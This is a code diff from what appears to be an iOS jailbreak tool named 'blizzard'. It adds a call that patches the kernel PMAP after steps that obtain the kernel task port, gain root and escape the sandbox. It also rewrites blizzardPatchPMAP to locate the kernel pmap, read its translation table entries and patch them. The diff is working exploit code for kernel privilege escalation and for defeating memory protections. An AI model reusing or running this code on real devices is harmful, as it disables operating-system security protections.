@@ -481,8 +481,10 @@ int blizzardGetTFP0(){
         blizzardGetAllproc();
         printf("Getting ROOT...\n");
         blizzardGetRoot();
-        printf("Escaping SandBox...\n\n");
+        printf("Escaping SandBox...\n");
         blizzardEscapeSandbox();
+        printf("Patching Kernel PMAP...\n");
+        blizzardPatchPMAP();
     } else {
         printf("FAILED to obtain Kernel Task Port!\n");
     }
@@ -604,14 +606,21 @@ int blizzardEscapeSandbox(){
 uint32_t pmaps[TTB_SIZE];
 int page_maps_count = 0;
 
-void blizzardPatchPMAP(mach_port_t tfp0, uintptr_t kernBase) {
-    uint32_t kernel_pmap            = find_pmap_location(kernBase, kdata, ksize);
+int blizzardPatchPMAP() {
+    uint32_t kernel_pmap            = KernelOffset(KernelBase, find_pmap_location(KernelBase, kdata, ksize));
     uint32_t kernel_pmap_store      = ReadKernel32(kernel_pmap);
     uint32_t tte_virt               = ReadKernel32(kernel_pmap_store);
     uint32_t tte_phys               = ReadKernel32(kernel_pmap_store+4);
     
-    printf("[i] Found Kernel PMAP Store at 0x%08x\n", kernel_pmap_store);
-    printf("[i] The Kernel PMAP TTE is at Virtual Address 0x%08x / Physical Address 0x%08x\n", tte_virt, tte_phys);
+    if (kernel_pmap == 0) {
+        printf("[!] Failed to locate Kernel PMAP. Aborting...\n");
+        return -1;
+    } else {
+        printf("[i] Got Kernel PMAP at 0x%x\n", kernel_pmap);
+    }
+    
+    printf("  -- [i] Found Kernel PMAP Store at 0x%08x\n", kernel_pmap_store);
+    printf("  -- [i] The Kernel PMAP TTE is at Virtual Address 0x%08x / Physical Address 0x%08x\n", tte_virt, tte_phys);
     
     uint32_t i;
     for (i = 0; i < TTB_SIZE; i++) {
@@ -645,4 +654,5 @@ void blizzardPatchPMAP(mach_port_t tfp0, uintptr_t kernBase) {
     
     printf("[+] Successfully patched Kernel PMAP!\n");
     usleep(100000);
+    return 0;
 }
